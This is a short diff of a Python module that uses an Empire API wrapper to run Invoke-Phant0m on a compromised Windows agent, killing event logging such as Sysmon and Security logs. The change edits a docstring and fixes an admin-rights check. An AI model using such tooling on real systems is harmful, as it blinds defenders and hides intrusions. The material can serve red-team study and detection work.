@@ -2,6 +2,7 @@
 Stops Windows Event Logging using Invoke-Phant0m:
 https://github.com/hlldz/Invoke-Phant0m
 Needs admin rights
+The script needs to be installed within your Empire (see script_path)
 Note that in Windows 7 & 10, Applications Log still works, the rest are dead eg. sysmon, security
 """
 from EmpireAPIWrapper import empireAPI
@@ -15,7 +16,8 @@ def run(API, agent_name, script_path='/Users/a/Empire/lib/Invoke-Phant0m.ps1'):
         \n:param agent_name: name of existing agent
         \n:param script_path: change the full path for your environment
     """
-    if(API.agents()['agents'][0]['high_integrity'] == 0):
+
+    if(API.agent_info(agent_name)['agents'][0]['high_integrity'] == 0):
         print('Need admin rights')
         return
     opt = management.invoke_script.options
